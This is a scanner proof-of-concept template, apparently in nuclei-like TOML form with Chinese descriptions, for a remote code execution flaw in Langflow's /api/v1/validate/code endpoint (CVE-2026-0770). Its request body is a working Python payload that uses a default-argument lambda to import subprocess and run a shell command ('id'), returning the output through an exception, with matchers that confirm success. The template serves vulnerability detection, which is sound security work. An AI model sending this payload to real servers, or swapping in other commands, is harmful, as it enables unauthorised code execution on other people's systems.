[info]
id = "POC-AVE-2026-0078"
name = "Langflow exec_globals 远程代码执行 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "langflow"]
description = "Langflow validate 端点 exec_globals 参数远程代码执行漏洞检测"
vuln_id = ["CVE-2026-0770", "AVE-2026-0078"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/api/v1/validate/code"

headers.Content-Type = "application/json"

body.type = "json"
body.code = "def exploit(_=(lambda r: (_ for _ in ()).throw(Exception('OUTPUT')))(__import__('subprocess').run('id', shell=True, capture_output=True, text=True))): pass"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["OUTPUT"]
expect = true
